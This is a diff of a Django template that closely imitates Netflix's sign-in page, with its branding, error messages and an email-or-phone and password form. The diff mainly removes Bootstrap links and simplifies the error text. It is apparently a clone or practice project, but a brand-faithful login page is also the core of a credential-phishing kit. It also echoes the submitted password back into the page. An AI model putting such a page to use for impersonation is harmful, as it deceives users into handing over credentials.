@@ -3,9 +3,8 @@
     <head>
         {% load static %}
         <meta charset="utf-8">
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-        <link rel="stylesheet" type="text/css" href="{% static 'css/style.css' %}">
         <link rel="stylesheet" type="text/css" href="{% static 'css/intlTelInput.css' %}">
+        <link rel="stylesheet" type="text/css" href="{% static 'css/style.css' %}">
         <title>Netflix Login Template | Login Page CSS</title>
     </head>
     <body>
@@ -20,23 +19,16 @@
                     {% csrf_token %}
                     <h1>Sign In</h1>
                     {% if failed %}
-                        <div data-uia="text" class="error-message">
-                        {% if number %}
-                            Sorry, we can't find an account with this number. Please make sure to select the correct country code or <b>sign in with email</b>.
-                        {% elif password %}
-                            Incorrect password. Please try again.
-                        {% else %}
-                            Sorry, we can't find an account with this email address. Please try again.
-                        {% endif %}
+                        <div data-uia="text" class="ui-message-contents">
+                            Sorry, we can't find an account with this {% if number %} number {% else %} email address{% endif %}. Please try again.
                         </div>
                     {% endif %}
                     <div class="input-text">
-                        <input id="email_and_phone" type="text"  name="email_and_phone" placeholder="Email or phone number" value="{{ email_and_phone }}">
+                        <input type="text" id="email_and_phone" name="email_and_phone" placeholder="Email or phone number" value="{{ email_and_phone }}">
                         <div class="warning-input" id="warningEmail">Please enter a valid email or phone number. </div>
                     </div>
-                    <div class="input-text input-group mb-2">
-                        <input class="text-box form-control" type="password" id="password" name="password" placeholder="Password" value="{{ password }}">
-                        <button class="toggle_button btn btn-outline-secondary" id="toggle_button" type="button" onclick="Toggle()">SHOW</button>
+                    <div class="input-text">
+                        <input type="password" id="password" name="password" placeholder="Password" value="{{ password }}">
                         <div class="warning-input" id="warningPassword">Your password must contain between 4 and 60 characters. </div>
                     </div>
                     <div>
@@ -86,6 +78,5 @@
         </div>
     <script src="{% static 'js/intlTelInput.min.js' %}"></script>
     <script src="{% static 'js/script.js' %}"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
     </body>
 </html>
